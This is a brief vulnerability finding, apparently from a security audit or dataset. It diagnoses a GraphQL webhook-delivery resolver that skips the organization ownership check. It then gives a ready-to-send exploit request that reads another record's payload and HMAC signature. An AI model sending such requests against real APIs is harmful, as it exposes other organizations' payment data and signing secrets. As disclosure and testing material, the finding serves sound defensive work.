diagnosis: The webhook delivery log resolver returns raw webhook payloads and cryptographic HMAC signatures via a DataLoader without checking if the delivery record belongs to info.context['current_user'].organization_id. An attacker can inspect outbound payloads containing sensitive payment callbacks, internal IDs, and secret signatures.
exploit_request:
POST /graphql HTTP/1.1
Host: api.developerhub.io
Authorization: Bearer <dev_user_token>
Content-Type: application/json

{"query": "query { webhookDeliveryRecord(deliveryId: \"891a2bc0-3482-411a-8e21-ef7701928a41\") { targetUrl requestBody hmacSignature } }"}
